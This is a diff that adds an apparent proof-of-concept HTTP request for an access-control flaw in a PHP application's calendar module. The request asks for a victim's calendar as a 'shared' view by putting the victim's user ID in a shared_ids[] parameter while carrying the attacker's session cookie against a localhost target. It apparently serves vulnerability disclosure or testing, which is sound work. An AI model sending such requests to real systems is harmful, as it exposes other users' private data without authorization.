@@ -1,0 +1,5 @@
+### Attacker requests V's calendar as a 'shared' view; A was never granted sharing by V.
+GET /index.php?module=Calendar&action=index&view=sharedWeek&shared_ids[]=4d14ce66-cd55-4e95-93c6-d27f356381d7 HTTP/1.1
+Host: localhost:33116
+Cookie: PHPSESSID=<attacker-session>
+User-Agent: <browser>
